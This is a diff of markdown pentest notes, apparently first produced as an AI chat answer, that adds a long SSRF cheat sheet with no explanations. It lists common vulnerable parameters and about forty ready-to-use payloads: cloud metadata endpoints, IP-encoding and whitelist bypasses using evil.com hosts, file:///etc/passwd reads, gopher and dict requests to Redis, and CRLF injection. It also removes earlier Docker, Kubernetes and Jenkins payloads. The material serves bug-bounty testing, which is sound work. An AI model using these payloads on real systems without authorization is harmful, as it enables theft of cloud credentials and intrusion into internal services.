@@ -3479,6 +3479,44 @@ Of course, Anvesh. Here’s a **structured agenda-wise SSRF test case list** tha
 
 Common parameters to checks: url, uri, dest, destination, redirect, redir, next, data, callback, return, site, domain, feed, host, hostname, port, path, reference, page, continue, window, out, view, show, navigation, to, target, rurl, rlink, link, img_url, file, source, img_src, download_url, proxy, load_url, open, forward, post_url, request_url
 
+## SSRF – Common Parameters List
+
+```
+url=
+uri=
+path=
+dest=
+destination=
+redirect=
+redirect_url=
+next=
+next_url=
+return=
+return_url=
+callback=
+callback_url=
+data=
+reference=
+site=
+fetch=
+feed=
+host=
+domain=
+image=
+image_url=
+avatar=
+profile_pic=
+file=
+download=
+load=
+link=
+forward=
+continue=
+proxy=
+target=
+api=
+endpoint=
+```
 ### 🧭 1. Initial Recon & Target Parameter Discovery
 - Identify all user-controlled URL parameters in GET/POST requests
 - Map potential SSRF sinks:
@@ -3639,91 +3677,256 @@ http://attacker.com/redirect?to=http://169.254.169.254/
 gopher://127.0.0.1:11211/_stats
 gopher://127.0.0.1:6379/_INFO
 ```
+Below is **same strict format** — **ONLY testcase names with payloads**, plus **advanced SSRF bypass techniques** and a **common SSRF parameter list**.
+(No explanations. Pentest / Bug bounty / GitHub ready.)
 
 ---
 
-# **4. Updated With Realistic Testing Payloads (Advanced Learning)**
+## Server-Side Request Forgery (SSRF) – Test Cases & Payloads
 
-### **4.1 AWS EC2 Metadata Dump**
-
-```
-http://169.254.169.254/latest/meta-data/iam/security-credentials/
-```
-
-### **4.2 Redis RCE Trigger (Safe string shown)**
+### 1. Basic SSRF
 
 ```
-gopher://127.0.0.1:6379/_SET test "Hello"
+url=http://127.0.0.1
 ```
 
-### **4.3 Docker API Exposure**
+### 2. Localhost Bypass
 
 ```
-http://localhost:2375/containers/json
+url=http://localhost
 ```
 
-### **4.4 Kubernetes API Exposure**
+### 3. Internal IP Access
 
 ```
-http://127.0.0.1:10250/pods
+url=http://192.168.1.1
 ```
 
-### **4.5 Jenkins Script Console**
+### 4. AWS Metadata (IMDSv1)
 
 ```
-http://localhost:8080/script
+url=http://169.254.169.254/latest/meta-data/
 ```
 
-### **4.6 VM Metadata via Redirect**
+### 5. AWS Metadata (IMDSv2 Bypass)
 
 ```
-http://open-redirect.com/?url=http://169.254.169.254/latest/
+url=http://169.254.169.254/latest/api/token
 ```
 
-### **4.7 Blind SSRF DNS Callback**
+### 6. GCP Metadata
 
 ```
-http://abc.your-burp-collab.com
+url=http://metadata.google.internal/
+```
+
+### 7. Azure Metadata
+
+```
+url=http://169.254.169.254/metadata/instance
+```
+
+### 8. IPv6 Localhost
+
+```
+url=http://[::1]
+```
+
+### 9. Decimal IP Encoding
+
+```
+url=http://2130706433
+```
+
+### 10. Hexadecimal IP Encoding
+
+```
+url=http://0x7f000001
+```
+
+### 11. Octal IP Encoding
+
+```
+url=http://0177.0.0.1
+```
+
+### 12. Mixed IP Encoding
+
+```
+url=http://127.1
+```
+
+### 13. DNS Rebinding
+
+```
+url=http://ssrf.evil.com
+```
+
+### 14. Whitelist Bypass (Subdomain)
+
+```
+url=http://allowed.com.evil.com
+```
+
+### 15. @ Symbol Bypass
+
+```
+url=http://127.0.0.1@evil.com
+```
+
+### 16. Fragment Bypass
+
+```
+url=http://evil.com#127.0.0.1
+```
+
+### 17. Path Confusion Bypass
+
+```
+url=http://evil.com/../@127.0.0.1
+```
+
+### 18. Redirect-Based SSRF
+
+```
+url=http://evil.com/redirect
+```
+
+### 19. URL Encoding Bypass
+
+```
+url=http%3a%2f%2f127.0.0.1
+```
+
+### 20. Double URL Encoding
+
+```
+url=http%253a%252f%252f127.0.0.1
+```
+
+### 21. CRLF Injection SSRF
+
+```
+url=http://evil.com%0d%0aHost:127.0.0.1
+```
+
+### 22. Protocol Bypass (File)
+
+```
+url=file:///etc/passwd
+```
+
+### 23. Protocol Bypass (Gopher)
+
+```
+url=gopher://127.0.0.1:80/_GET /
+```
+
+### 24. Protocol Bypass (FTP)
+
+```
+url=ftp://127.0.0.1
+```
+
+### 25. Protocol Bypass (Dict)
+
+```
+url=dict://127.0.0.1:6379/info
+```
+
+### 26. Parameter Pollution SSRF
+
+```
+url=http://evil.com&url=http://127.0.0.1
+```
+
+### 27. JSON Body SSRF
+
+```
+{"url":"http://127.0.0.1"}
+```
+
+### 28. Header-Based SSRF
+
+```
+X-Forwarded-For: 127.0.0.1
+```
+
+### 29. Referer-Based SSRF
+
+```
+Referer: http://127.0.0.1
+```
+
+### 30. Host Header SSRF
+
+```
+Host: 127.0.0.1
 ```
 
 ---
 
-# **5. Validation / Test Steps**
+## SSRF – Advanced Bypass Techniques (Payloads)
 
-**Step 1:** Identify any parameter accepting a URL
-→ `url=`, `image=`, `callback=`, `redirect=`, `feed=`, etc.
+### 31. Mixed Case Scheme
 
-**Step 2:** Test internal access
-→ `http://localhost`, `http://127.0.0.1`, etc.
+```
+url=HtTp://127.0.0.1
+```
 
-**Step 3:** Try metadata service
-→ `169.254.169.254`
+### 32. Unicode Normalization
 
-**Step 4:** Try protocol shifts
-→ `file://`, `gopher://`, `ftp://`
+```
+url=http://ⓁⓄⒸⒶⓁⒽⓄⓈⓉ
+```
 
-**Step 5:** Try bypass techniques
-→ encodings, redirects, IPv6, DNS rebinding.
+### 33. Trailing Dot Bypass
 
----
+```
+url=http://localhost.
+```
 
-# **6. Expected Results / Impact**
+### 34. Tab Injection
 
-* Internal systems become reachable.
-* Metadata services leak secrets.
-* Admin portals exposed.
-* Redis/Memcached/DB exploitation.
-* Possible **RCE** in chained scenarios.
-  
-### Testing with Burp Collaborator:
-1. Open Burp Collaborator.
-2. Set interaction poll.
-3. Inject payload in a vulnerable parameter:
-   ```
-   /showimage.php?file=http://burp-collaborator-url
-   ```
-4. Check logs in Burp for external requests.
+```
+url=http://127.0.0.1%09.evil.com
+```
 
+### 35. Null Byte Injection
+
+```
+url=http://127.0.0.1%00.evil.com
+```
+
+### 36. DNS Alias Bypass
+
+```
+url=http://0.0.0.0
+```
+
+### 37. IPv6 Mapped IPv4
+
+```
+url=http://[::ffff:127.0.0.1]
+```
+
+### 38. Burp Collaborator SSRF
+
+```
+url=http://ssrf.burpcollaborator.net
+```
+
+### 39. Time-Based Blind SSRF
+
+```
+url=http://10.255.255.1
+```
+
+### 40. SSRF via Image URL
+
+```
+image=http://127.0.0.1
+```
 ## 4. Critical Files Exposure
 
 ### Impact:
